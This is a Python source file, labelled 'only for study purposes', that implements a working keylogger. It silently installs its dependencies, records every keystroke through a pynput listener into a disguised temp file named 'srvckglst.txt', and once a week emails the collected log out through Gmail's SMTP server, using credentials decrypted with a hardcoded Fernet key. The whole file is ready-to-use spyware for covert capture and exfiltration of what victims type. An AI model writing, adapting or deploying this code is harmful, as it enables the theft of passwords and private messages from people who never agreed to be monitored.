#------------------------ Binary Leo 2021 - BR -----------------------------
#-----------------------Only for study purposes-----------------------------

import tempfile
import os
import smtplib, ssl
import datetime
import subprocess
import sys
from pathlib import Path

try:
    from pynput.keyboard import Listener
    from cryptography.fernet import Fernet
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", 'pynput'])
    subprocess.check_call([sys.executable, "-m", "pip", "install", 'cryptography'])
finally:
     from pynput.keyboard import Listener
     from cryptography.fernet import Fernet
    

now = datetime.datetime.now() #yyyy/mm/dd hh:mm:ss.000000
#print(now)
daynow = datetime.datetime.today().weekday() #Return the day of the week as an integer to control when system send data through e-mail
#print(daynow)

#start to create tempfile pathlib
logger_path = tempfile.gettempdir()# Where we will store a txt file with data
#print(logger_path)
logger_file = logger_path +'\srvckglst.txt' # set the log file
#print(logger_file)

#key= Fernet.generate_key()
#After generate your own secret, we can comment here and set directly in code below.
key = b'zR3EOrp8wRvFIIE1flGz991RGpdEdX4gAAHHkzGH134='
#print(key)
cipher_suite = Fernet(key)

#-----------------------------------------------------------------------------
#ciphered_text = cipher_suite.encrypt(b'an_mail_here@gmail.com')               | 
#required for be bytes - cipher here an e-mail and password for further use. | ---------
#print(ciphered_text)                                                        |         |
#-----------------------------------------------------------------------------         |
#                                                                                      |
ciphered_pass = b'' # Insert between quotes your encoded password
ciphered_mail = b'' # Insert between quotes your encoded e-mail

unciphered_pass = (cipher_suite.decrypt(ciphered_pass))
unciphered_mail = (cipher_suite.decrypt(ciphered_mail))
decoded_mail = str(unciphered_mail.decode('utf-8'))
decoded_pass = str(unciphered_pass.decode('utf-8'))
if os.path.isfile(logger_file):
   if daynow == 5 and now.hour > 10: 
       
        with open(logger_file, "r") as f:
            #----------------------------------------------            
            Honey_pot = f.read() # Collected data.         |
            #---------------------------------------------- 
            #print(Honey_pot)  <<< Only for test.
            port = 465  # For SSL
            smtp_server = "smtp.gmail.com"
            sender_email = decoded_mail
            receiver_email = decoded_mail
            password = decoded_pass
            message = Honey_pot
            context = ssl.create_default_context()
            with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
                server.login(sender_email, password)
                server.sendmail(sender_email, receiver_email, message)    
           
else:
    fid = os.path.join(logger_path, "\srvckglst.txt") # If the file not exists - create one
    filegn = open(fid, "w")
    toFile = ".. start ..." 
    filegn.write(toFile)
    filegn.close()
  
def writeLog(key): 
    # Dict keys to be translated.
    translate_keys = { 
        "Key.space": " ",
        "Key.shift": "@", 
        "Key.shift_r": "", 
        "Key.shift_l": "",
        "Key.enter": "\n", 
        "Key.alt": "", 
        "Key.esc": "", 
        "Key.cmd": "", 
        "Key.caps_lock": "",
        "<191>":"/",
    
        #numpad --- Brazilian keyboard - Pattern.
        "<96>":"0",
        "<97>":"1",
        "<98>":"2",
        "<99>":"3",
        "<100>":"4",
        "<101>":"5",
        "<102>":"6",
        "<103>":"7",
        "<104>":"8",
        "<105>":"9",
    
            } 
#Pressed key as String.
    keydata = str(key) 
    #Remove quotes.
    keydata = keydata.replace("'", "") 
    for key in translate_keys: 
        #key receives the translate_keys .
        #Replace the key value using the (translate_keys[key]). 
        keydata = keydata.replace(key, translate_keys[key])
    with open(logger_file, "a+") as f: 
        f.write(keydata) 
#starts the keyboard listener to the event on_press.
#************************************************************

#During on_press calls writeLog function.
with Listener(on_press=writeLog) as l: 
    l.join()